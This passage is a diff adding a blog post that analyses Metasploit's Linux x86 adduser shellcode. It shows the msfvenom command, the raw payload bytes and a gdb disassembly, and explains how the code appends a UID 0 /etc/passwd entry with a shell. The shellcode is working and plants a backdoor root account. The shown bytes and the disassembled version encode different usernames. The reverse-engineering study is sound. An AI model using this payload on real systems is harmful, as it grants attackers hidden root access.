@@ -1,0 +1,178 @@
+
+In this post, I analyze the adduser shellcode of metasploit, created as
+specified bellow: The idea is to createa user miusuario with pass miclave.
+
+       Name: Linux Add User
+     Module: payload/linux/x86/adduser
+   Platform: Linux
+       Arch: x86
+Needs Admin: Yes
+ Total size: 97
+       Rank: Normal
+
+Provided by:
+    skape <mmiller@hick.org>
+    vlad902 <vlad902@gmail.com>
+    spoonm <spoonm@no$email.com>
+
+Basic options:
+Name   Current Setting  Required  Description
+----   ---------------  --------  -----------
+PASS   metasploit       yes       The password for this user
+SHELL  /bin/sh          no        The shell for this user
+USER   metasploit       yes       The username to create
+
+Description:
+  Create a new user with UID 0
+
+
+    Name                Current Setting  Required  Description
+    ----                ---------------  --------  -----------
+    AppendExit          false            no        Append a stub that executes the exit(0) system call
+    PrependChrootBreak  false            no        Prepend a stub that will break out of a chroot (includes setreuid to root)
+    PrependFork         false            no        Prepend a stub that executes: if (fork()) { exit(0); }
+    PrependSetgid       false            no        Prepend a stub that executes the setgid(0) system call
+    PrependSetregid     false            no        Prepend a stub that executes the setregid(0, 0) system call
+    PrependSetresgid    false            no        Prepend a stub that executes the setresgid(0, 0, 0) system call
+    PrependSetresuid    false            no        Prepend a stub that executes the setresuid(0, 0, 0) system call
+    PrependSetreuid     false            no        Prepend a stub that executes the setreuid(0, 0) system call
+    PrependSetuid       false            no        Prepend a stub that executes the setuid(0) system call
+    VERBOSE             false            no        Enable detailed status messages
+    WORKSPACE                            no        Specify the workspace for this module
+    Name  Current Setting  Required  Description
+    ----  ---------------  --------  -----------
+
+msfvenom -p linux/x86/adduser PASS=user USER=pass -f c --smallest >> adduser.txt
+91 bytes
+
+unsigned char buf[] = 
+"\x31\xc9\x89\xcb\x6a\x46\x58\xcd\x80\x6a\x05\x58\x31\xc9\x51"
+"\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63"
+"\x89\xe3\x41\xb5\x04\xcd\x80\x93\xe8\x22\x00\x00\x00\x70\x61"
+"\x73\x73\x3a\x41\x7a\x49\x65\x58\x79\x45\x77\x4d\x65\x48\x58"
+"\x36\x3a\x30\x3a\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x73"
+"\x68\x0a\x59\x8b\x51\xfc\x6a\x04\x58\xcd\x80\x6a\x01\x58\xcd"
+"\x80";
+
+Once included in a C file and compile as   433  gcc -m32 -fno-stack-protector -z execstack main.c -o main -g
+we disassemble the shellcode (code[]):
+
+
+First thing we do is to analyize the three strings are pushed into the
+stack:
+
+string analysis:
+
+push   $0x64777373
+push   $0x61702f2f
+push   $0x6374652f
+
+dwssap//cte/
+
+It corresponds to /etc/passwd
+
+warning: ~/.gdbinit.local: No such file or directory
+Reading symbols from ./main...done.
+gdb$ disas code
+Dump of assembler code for function code:
+
+syscall: 0x46: 	sys_setreuid16	0x46	old_uid_t ruid	old_uid_t euid
+
+set euid 0, becomes root?
+
+
+
+   0x00002020 <+0>:	xor    %ecx,%ecx
+   0x00002022 <+2>:	mov    %ecx,%ebx
+
+   0x00002024 <+4>:	push   $0x46
+   0x00002026 <+6>:	pop    %eax
+   0x00002027 <+7>:	int    $0x80
+
+
+sys_open	0x05	const char __user *filename	int flags	int mode
+
+it opens /etc/passwd
+
+
+ inc ecx ; set O_WRONLY flag (01)
+ mov ch,0x4 ; set O_APPEND flag (02000)
+
+
+   0x00002029 <+9>:	push   $0x5
+   0x0000202b <+11>:	pop    %eax
+   0x0000202c <+12>:	xor    %ecx,%ecx
+   0x0000202e <+14>:	push   %ecx
+   0x0000202f <+15>:	push   $0x64777373
+   0x00002034 <+20>:	push   $0x61702f2f
+   0x00002039 <+25>:	push   $0x6374652f
+   0x0000203e <+30>:	mov    %esp,%ebx
+   0x00002040 <+32>:	inc    %ecx
+   0x00002041 <+33>:	mov    $0x4,%ch
+   0x00002043 <+35>:	int    $0x80
+
+
+   0x00002045 <+37>:	xchg   %eax,%ebx
+   0x00002046 <+38>:	call   0x2072 <code+82>
+
+--
+
+   0x0000204b <+43>:	insl   (%dx),%es:(%edi)
+   0x0000204c <+44>:	imul   $0x69726175,0x73(%ebp),%esi
+   0x00002053 <+51>:	outsl  %ds:(%esi),(%dx)
+   0x00002054 <+52>:	cmp    0x7a(%ecx),%al
+   0x00002057 <+55>:	push   $0x70457732
+   0x0000205c <+60>:	xor    %ah,0x6d(%edx)
+   0x0000205f <+63>:	inc    %ebx
+   0x00002060 <+64>:	push   %eax
+   0x00002061 <+65>:	cmp    (%bx,%si),%dh
+   0x00002064 <+68>:	cmp    (%eax),%dh
+   0x00002066 <+70>:	cmp    (%edx),%bh
+   0x00002068 <+72>:	das    
+   0x00002069 <+73>:	cmp    (%edi),%ch
+   0x0000206b <+75>:	bound  %ebp,0x6e(%ecx)
+   0x0000206e <+78>:	das    
+   0x0000206f <+79>:	jae    0x20d9
+   0x00002071 <+81>:	or     -0x75(%ecx),%bl
+
+--
+
+sys_write	0x04	unsigned int fd	const char __user *buf	size_t count	-
+
+   0x00002074 <+84>:	push   %ecx
+   0x00002075 <+85>:	cld    
+   0x00002076 <+86>:	push   $0x4
+   0x00002078 <+88>:	pop    %eax
+   0x00002079 <+89>:	int    $0x80
+
+sys_exit
+
+
+   0x0000207b <+91>:	push   $0x1
+   0x0000207d <+93>:	pop    %eax
+   0x0000207e <+94>:	int    $0x80
+   0x00002080 <+96>:	add    %al,(%eax)
+
+On the other hand in the memory dump after the call:
+
+gdb$ x/40xc 0x0000204b
+0x204b <code+43>:	0x6d	0x69	0x75	0x73	0x75	0x61	0x72	0x69
+0x2053 <code+51>:	0x6f	0x3a	0x41	0x7a	0x68	0x32	0x77	0x45
+0x205b <code+59>:	0x70	0x30	0x62	0x6d	0x43	0x50	0x67	0x3a
+0x2063 <code+67>:	0x30	0x3a	0x30	0x3a	0x3a	0x2f	0x3a	0x2f
+0x206b <code+75>:	0x62	0x69	0x6e	0x2f	0x73	0x68	0xa	0x59
+
+There is almost 40 bytes between  call   0x2072 <code+82>
+and  0x0000204b <+43>.
+
+0x6d	0x69	0x75	0x73	0x75	0x61	0x72	0x69
+0x6f	0x3a	0x41	0x7a	0x68	0x32	0x77	0x45
+0x70	0x30	0x62	0x6d	0x43	0x50	0x67	0x3a
+0x30	0x3a	0x30	0x3a	0x3a	0x2f	0x3a	0x2f
+0x62	0x69	0x6e	0x2f	0x73	0x68	0xa	0x59
+
+miusuario:Azh2wEp0bmCPg:0:0::/:/bin/shY
+
+It corresponds to the entry in /etc/passwd.
+
+
